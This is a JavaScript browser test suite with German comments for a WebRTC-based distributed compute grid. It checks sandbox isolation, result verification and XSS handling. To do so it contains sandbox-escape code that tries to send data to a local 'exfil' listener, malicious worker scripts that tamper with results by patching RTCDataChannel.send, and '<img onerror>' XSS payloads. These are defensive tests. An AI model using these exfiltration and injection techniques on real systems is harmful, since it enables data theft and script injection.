// Browser-Tests: Firefox (headless, WebDriver BiDi) über puppeteer-core.
// Voraussetzungen: rust_worker/pkg gebaut, Firefox installiert, `npm install` in diesem Ordner.
// Ausführen: npm test   (Firefox-Pfad über FIREFOX, Standard /usr/bin/firefox; einzelne Tests: npm test -- sobel)
import puppeteer from 'puppeteer-core';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const FIREFOX = process.env.FIREFOX || '/usr/bin/firefox';
const TOKEN = 'browser-test-token';
const sleep = ms => new Promise(r => setTimeout(r, ms));
let BASE;

function freePort() {
    return new Promise(resolve => {
        const s = net.createServer().listen(0, '127.0.0.1', () => {
            const { port } = s.address();
            s.close(() => resolve(port));
        });
    });
}

async function startServer() {
    const port = await freePort();
    const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith('GRID_')));
    const proc = spawn('python3', ['main.py'], {
        cwd: ROOT, env: { ...env, GRID_PORT: String(port), GRID_REQUESTER_TOKEN: TOKEN }, stdio: ['ignore', 'pipe', 'pipe'],
    });
    let log = '';
    proc.stdout.on('data', d => log += d);
    proc.stderr.on('data', d => log += d);
    for (let i = 0; i < 60; i++) {
        try {
            await fetch(`http://127.0.0.1:${port}/`);
            return { proc, base: `http://127.0.0.1:${port}`, log: () => log };
        } catch { await sleep(250); }
    }
    proc.kill();
    throw new Error('Server startet nicht:\n' + log);
}

// Zählt jeden Zugriff -- Ziel für Ausbruchsversuche aus der Sandbox
async function startExfilListener() {
    const port = await freePort();
    const hits = [];
    const server = http.createServer((req, res) => {
        hits.push(`${req.method} ${req.url}`);
        res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/javascript' });
        res.end('1');
    }).listen(port, '127.0.0.1');
    return { url: `http://127.0.0.1:${port}`, hits, close: () => server.close() };
}

async function withBrowser(fn) {
    const browser = await puppeteer.launch({
        browser: 'firefox', executablePath: FIREFOX, headless: true,
        extraPrefsFirefox: { 'media.peerconnection.ice.obfuscate_host_addresses': false },
    });
    try { return await fn(browser); } finally { await browser.close(); }
}

async function openWorker(browser, preload) {
    const page = await browser.newPage();
    if (preload) await page.evaluateOnNewDocument(preload);
    await page.goto(BASE + '/worker');
    return page;
}

async function openRequester(browser, workers) {
    const page = await browser.newPage();
    page.errors = [];
    page.on('pageerror', e => page.errors.push(e.message));
    await page.goto(`${BASE}/requester#token=${TOKEN}`);
    await page.waitForFunction(n => Object.values(peers).filter(p => p.dc?.readyState === 'open').length >= n,
        { timeout: 20000 }, workers);
    return page;
}

// Testbild im Browser erzeugen und in #imageInput legen (keine Fixture-Dateien nötig)
async function setTestImage(page, kind) {
    await page.evaluate(async kind => {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        if (kind === 'twoColor') {
            c.width = 120; c.height = 70;
            ctx.fillStyle = 'rgb(10,200,40)'; ctx.fillRect(0, 0, 60, 70);
            ctx.fillStyle = 'rgb(250,5,128)'; ctx.fillRect(60, 0, 60, 70);
        } else {
            c.width = 160; c.height = 130;
            const img = ctx.createImageData(c.width, c.height);
            let seed = 42;
            for (let i = 0; i < img.data.length; i++) {
                seed = (seed * 1103515245 + 12345) >>> 0;
                img.data[i] = (i % 4 === 3) ? 255 : seed >>> 24;
            }
            ctx.putImageData(img, 0, 0);
        }
        const blob = await new Promise(r => c.toBlob(r, 'image/png'));
        const dt = new DataTransfer();
        dt.items.add(new File([blob], 'test.png', { type: 'image/png' }));
        document.getElementById('imageInput').files = dt.files;
    }, kind);
}

async function runImageJob(page, { type, code = '', redundancy, image = 'twoColor', afterStart }) {
    await page.evaluate((type, code, redundancy) => {
        scheduler.requiredRedundancy = redundancy;
        document.getElementById('redundancyLevel').value = String(redundancy);
        document.getElementById('effectType').value = type;
        document.getElementById('customCode').value = code;
    }, type, code, redundancy);
    await setTestImage(page, image);
    await page.evaluate(() => uploadAndProcess());
    if (afterStart) await afterStart();
    await page.waitForFunction(() => totalTiles > 0 && finishedTiles === totalTiles, { timeout: 40000 });
}

// Vergleicht das Ergebnis des Zweifarben-Bilds mit der erwarteten Pixelfunktion
function countPixels(page, expected) {
    return page.evaluate(expected => {
        const want = new Function('x', `return ${expected};`);
        const d = mainCanvas.getContext('2d').getImageData(0, 0, mainCanvas.width, mainCanvas.height).data;
        const r = { correct: 0, untouched: 0, wrong: 0 };
        for (let y = 0; y < mainCanvas.height; y++) for (let x = 0; x < mainCanvas.width; x++) {
            const i = (y * mainCanvas.width + x) * 4, px = [d[i], d[i + 1], d[i + 2], d[i + 3]].join();
            if (px === want(x)) r.correct++; else if (px === '0,0,0,0') r.untouched++; else r.wrong++;
        }
        return r;
    }, expected);
}
const INVERTED = `x < 60 ? '245,55,215,255' : '5,250,127,255'`;
const SWAPPED_RB = `x < 60 ? '40,200,10,255' : '128,5,250,255'`;
const INVERT_CODE = 'return [255-r,255-g,255-b,a];';

// Bösartiger Worker: verfälscht jedes Ergebnis um 1 Byte und setzt die Position in den Metadaten auf 0,0
const EVIL_RESULTS = `(() => {
    const orig = RTCDataChannel.prototype.send;
    RTCDataChannel.prototype.send = function (d) {
        if (typeof d === 'string') {
            try { const m = JSON.parse(d); if (m.tileId !== undefined) { m.x = 0; m.y = 0; d = JSON.stringify(m); } } catch {}
            return orig.call(this, d);
        }
        const c = (d instanceof ArrayBuffer ? new Uint8Array(d) : new Uint8Array(d.buffer, d.byteOffset, d.byteLength)).slice();
        if (c.length) c[0] ^= 0xFF;
        return orig.call(this, c);
    };
})();`;

// Bösartiger Worker: HTML statt Zahlen in WORKER_INFO/PONG
const EVIL_INFO = `(() => {
    const orig = RTCDataChannel.prototype.send;
    RTCDataChannel.prototype.send = function (d) {
        if (typeof d === 'string') {
            try {
                const m = JSON.parse(d);
                if (m.type === 'WORKER_INFO') { m.cores = '<img src=x onerror="window.__xss=1">'; m.score = '<img src=x onerror="window.__xss=1">'; }
                if (m.type === 'PONG') m.time = '<img src=x onerror="window.__xss=1">';
                d = JSON.stringify(m);
            } catch {}
        }
        return orig.call(this, d);
    };
})();`;

const HUGE_CORES = `(() => {
    const orig = RTCDataChannel.prototype.send;
    RTCDataChannel.prototype.send = function (d) {
        if (typeof d === 'string') { try { const m = JSON.parse(d); if (m.type === 'WORKER_INFO') { m.cores = 1e9; d = JSON.stringify(m); } } catch {} }
        return orig.call(this, d);
    };
})();`;

// Führt einen Job direkt über compute_node.js aus (ohne WebRTC)
async function computeNode(page, jobs) {
    return page.evaluate(async jobs => {
        const w = new Worker('/compute_node.js', { type: 'module' });
        const results = [];
        for (const { header, bytes } of jobs) {
            const t0 = Date.now();
            results.push(await new Promise(res => {
                w.onmessage = e => res({ type: e.data.metadata.type, bytes: Array.from(e.data.pixels), ms: Date.now() - t0 });
                const buf = new Uint8Array(bytes).buffer;
                w.postMessage({ header, pixels: buf }, [buf]);
            }));
        }
        w.terminate();
        return results;
    }, jobs);
}

const tests = {
    async sandbox() {
        const exfil = await startExfilListener();
        try {
            await withBrowser(async browser => {
                const page = await browser.newPage();
                await page.goto(BASE + '/');
                const evil = `
                    const r = [];
                    const t = f => { try { f(); r.push(1); } catch (e) { r.push(0); } };
                    t(() => importScripts('${exfil.url}/importScripts'));
                    t(() => { const x = new XMLHttpRequest(); x.open('GET', '${exfil.url}/xhr', false); x.send(); });
                    t(() => new Worker('data:text/javascript,fetch("${exfil.url}/subworker")'));
                    t(() => new WebSocket('${exfil.url.replace('http', 'ws')}/ws'));
                    t(() => new EventSource('${exfil.url}/eventsource'));
                    fetch('${exfil.url}/fetch').catch(() => {});
                    import('${exfil.url}/import.js').catch(() => {});
                    Function('return this')().fetch('${exfil.url}/fetch-globalThis').catch(() => {});
                    return new Uint8Array(r);`;
                const [invert, bigData, attack, loop, afterLoop] = await computeNode(page, [
                    { header: { type: 'CUSTOM_LOGIC', customCode: INVERT_CODE }, bytes: [0, 10, 200, 255] },
                    { header: { type: 'BIG_DATA', customCode: 'return data.map(x => x * 2);' }, bytes: [1, 2, 3] },
                    { header: { type: 'BIG_DATA', customCode: evil }, bytes: [0] },
                    { header: { type: 'BIG_DATA', customCode: 'while (true) {}' }, bytes: [1] },
                    { header: { type: 'CUSTOM_LOGIC', customCode: INVERT_CODE }, bytes: [0, 0, 0, 0] },
                ]);
                assert.deepEqual(invert.bytes, [255, 245, 55, 255]);
                assert.deepEqual(bigData.bytes, [2, 4, 6]);
                // Synchron prüfbar sind nur importScripts und XHR; Worker/WebSocket/EventSource/fetch/import
                // scheitern asynchron an der CSP -> abgedeckt durch den Exfil-Listener unten
                assert.equal(attack.bytes[0], 0, 'importScripts muss blockiert sein');
                assert.equal(attack.bytes[1], 0, 'XHR muss blockiert sein');
                assert.deepEqual(loop.bytes, [], 'Endlosschleife muss abgebrochen werden');
                assert.ok(loop.ms >= 9000 && loop.ms < 15000, `Timeout nach ${loop.ms} ms`);
                assert.deepEqual(afterLoop.bytes, [255, 255, 255, 0], 'Sandbox muss nach Timeout neu starten');
                await sleep(2000); // asynchrone Versuche (fetch, import, WebSocket ...) abwarten
            });
            assert.deepEqual(exfil.hits, [], 'kein Zugriff aus der Sandbox nach außen');
        } finally { exfil.close(); }
    },

    async requesterAuth() {
        await withBrowser(async browser => {
            const page = await browser.newPage();
            page.on('dialog', d => d.accept('falscher-token'));
            await page.goto(BASE + '/requester');
            await page.waitForFunction(() => globalStatus.innerText.includes('DENIED'), { timeout: 10000 });
            assert.equal(await page.evaluate(() => Object.keys(peers).length), 0);
        });
    },

    async twoRequesters() {
        await withBrowser(async browser => {
            const worker = await openWorker(browser);
            await sleep(1500);
            const r1 = await openRequester(browser, 1), r2 = await openRequester(browser, 1);
            await sleep(500);
            assert.equal(await worker.evaluate(() => p2pStatus.innerText), 'READY (2 requesters)');
            await Promise.all([
                runImageJob(r1, { type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 1 }),
                runImageJob(r2, { type: 'CUSTOM_LOGIC', code: 'return [b,g,r,a];', redundancy: 1 }),
            ]);
            assert.equal((await countPixels(r1, INVERTED)).correct, 8400);
            assert.equal((await countPixels(r2, SWAPPED_RB)).correct, 8400);
            await r1.close();
            await sleep(1500);
            assert.equal(await worker.evaluate(() => p2pStatus.innerText), 'READY (1 requester)');
            await runImageJob(r2, { type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 1 });
            assert.equal((await countPixels(r2, INVERTED)).correct, 8400);
            assert.deepEqual(r2.errors, []);
        });
    },

    async verificationRejectsMinority() {
        await withBrowser(async browser => {
            await openWorker(browser); await openWorker(browser); await openWorker(browser, EVIL_RESULTS);
            await sleep(2500);
            const req = await openRequester(browser, 3);
            await runImageJob(req, { type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 2 });
            assert.deepEqual(await countPixels(req, INVERTED), { correct: 8400, untouched: 0, wrong: 0 });
            assert.equal(await req.evaluate(() => globalStatus.innerText), 'COMPUTATION COMPLETED!');
        });
    },

    async verificationReportsConflicts() {
        await withBrowser(async browser => {
            await openWorker(browser); await openWorker(browser, EVIL_RESULTS);
            await sleep(2500);
            const req = await openRequester(browser, 2);
            await runImageJob(req, { type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 2 });
            assert.deepEqual(await countPixels(req, INVERTED), { correct: 0, untouched: 8400, wrong: 0 },
                'ohne Mehrheit darf nichts gezeichnet werden');
            assert.match(await req.evaluate(() => globalStatus.innerText), /6 TILE\(S\) WITHOUT CONSENSUS/);
        });
    },

    async verificationWaitsForRedundancy() {
        await withBrowser(async browser => {
            await openWorker(browser);
            await sleep(2500);
            const req = await openRequester(browser, 1);
            await runImageJob(req, {
                type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 2, afterStart: async () => {
                    await sleep(3000);
                    assert.match(await req.evaluate(() => globalStatus.innerText), /^WAITING FOR 2 WORKERS/);
                    assert.equal(await req.evaluate(() => finishedTiles), 0);
                    await openWorker(browser);
                },
            });
            assert.equal((await countPixels(req, INVERTED)).correct, 8400);
        });
    },

    async workerDisconnectReassignsTiles() {
        await withBrowser(async browser => {
            const first = await openWorker(browser);
            await openWorker(browser); await openWorker(browser);
            await sleep(2500);
            const req = await openRequester(browser, 3);
            await runImageJob(req, {
                type: 'CUSTOM_LOGIC', code: INVERT_CODE, redundancy: 2,
                afterStart: async () => { await sleep(150); await first.close(); },
            });
            assert.equal((await countPixels(req, INVERTED)).correct, 8400);
        });
    },

    async xss() {
        await withBrowser(async browser => {
            await openWorker(browser, EVIL_INFO); await openWorker(browser, HUGE_CORES);
            await sleep(2500);
            const req = await openRequester(browser, 2);
            await sleep(4000); // mindestens ein PING/PONG-Zyklus
            await req.evaluate(() => {
                const dt = new DataTransfer();
                dt.items.add(new File([new Uint8Array(100)], '<img src=x onerror="window.__xss=1">.bin'));
                document.getElementById('rawFileInput').files = dt.files;
                document.getElementById('customCode').value = 'return data;';
                processRawData();
            });
            await sleep(1500);
            const r = await req.evaluate(() => ({
                xss: !!window.__xss,
                imgTags: document.querySelectorAll('#workerList img, #dataConsole img').length,
                capacities: Object.values(peers).map(p => p.capacity).sort((a, b) => a - b),
                fileLogged: dataConsole.innerText.includes('<img src=x'),
            }));
            assert.equal(r.xss, false, 'eingeschleustes Skript darf nicht laufen');
            assert.equal(r.imgTags, 0);
            assert.deepEqual(r.capacities, [1, 256], 'ungültige Kernzahl ignoriert, 1e9 auf 256 begrenzt');
            assert.ok(r.fileLogged, 'Dateiname wird als Text angezeigt');
        });
    },

    async dashboard() {
        await withBrowser(async browser => {
            await openWorker(browser);
            await sleep(2500);
            const page = await browser.newPage();
            page.errors = [];
            page.on('pageerror', e => page.errors.push(e.message));
            await page.goto(BASE + '/');
            await sleep(1000);
            const r = await page.evaluate(() => ({ nodes: nodes.innerText, power: Number(power.innerText) }));
            assert.equal(r.nodes, '1');
            assert.ok(r.power > 0);
            assert.deepEqual(page.errors, []);
        });
    },

    async wasmRobustness() {
        await withBrowser(async browser => {
            const page = await browser.newPage();
            const logs = [];
            page.on('console', m => logs.push(m.text()));
            await page.goto(BASE + '/');
            const r = await computeNode(page, [
                { header: { type: 'IMAGE_SOBEL', w: 0, h: 0 }, bytes: new Array(16).fill(9) },
                { header: { type: 'IMAGE_SOBEL', w: 50, h: 50 }, bytes: new Array(16).fill(9) },
                { header: { type: 'IMAGE_SOBEL', w: 4294967295, h: 4294967295 }, bytes: new Array(16).fill(9) },
                { header: { type: 'IMAGE_PROC' }, bytes: [1, 2, 3, 4, 5, 6] },
                { header: { type: 'IMAGE_SOBEL', w: 3, h: 3 }, bytes: new Array(36).fill(9) },
            ]);
            assert.deepEqual(r.map(x => x.bytes.length), [0, 0, 0, 6, 36]);
            assert.deepEqual(r[3].bytes, [254, 253, 252, 4, 5, 6]);
            assert.deepEqual(logs.filter(l => /unreachable|RuntimeError|Compute Error/.test(l)), []);
        });
    },

    async sobelHasNoTileSeams() {
        await withBrowser(async browser => {
            await openWorker(browser); await openWorker(browser);
            await sleep(2500);
            const req = await openRequester(browser, 2);
            await runImageJob(req, { type: 'IMAGE_SOBEL', redundancy: 2, image: 'noise' });
            // Referenz: Sobel über das ganze Bild in einem Stück, aus demselben Eingabebild
            const diff = await req.evaluate(async () => {
                const file = document.getElementById('imageInput').files[0];
                const img = new Image(); img.src = URL.createObjectURL(file); await img.decode();
                const c = document.createElement('canvas'); c.width = img.width; c.height = img.height;
                const cx = c.getContext('2d'); cx.drawImage(img, 0, 0);
                const input = cx.getImageData(0, 0, img.width, img.height).data;
                const w = new Worker('/compute_node.js', { type: 'module' });
                const ref = await new Promise(res => {
                    w.onmessage = e => res(e.data.pixels);
                    const buf = new Uint8Array(input).buffer;
                    w.postMessage({ header: { type: 'IMAGE_SOBEL', w: img.width, h: img.height }, pixels: buf }, [buf]);
                });
                w.terminate();
                const got = mainCanvas.getContext('2d').getImageData(0, 0, img.width, img.height).data;
                let n = 0;
                for (let i = 0; i < got.length; i++) if (got[i] !== ref[i]) n++;
                return n;
            });
            assert.equal(diff, 0, 'Ergebnis aus Tiles muss der Rechnung über das ganze Bild entsprechen');
        });
    },
};

const only = process.argv.slice(2);
const selected = Object.entries(tests).filter(([name]) => !only.length || only.some(o => name.toLowerCase().includes(o.toLowerCase())));
const server = await startServer();
BASE = server.base;
let failed = 0;
try {
    for (const [name, fn] of selected) {
        const t0 = Date.now();
        try {
            await fn();
            console.log(`✔ ${name} (${((Date.now() - t0) / 1000).toFixed(1)} s)`);
        } catch (e) {
            failed++;
            console.log(`✘ ${name}: ${e.message}`);
        }
    }
} finally {
    server.proc.kill();
}
if (/Traceback/.test(server.log())) {
    failed++;
    console.log('✘ Server-Log enthält Exceptions:\n' + server.log());
}
console.log(failed ? `\n${failed} fehlgeschlagen` : `\nAlle ${selected.length} Tests bestanden`);
process.exit(failed ? 1 : 0);
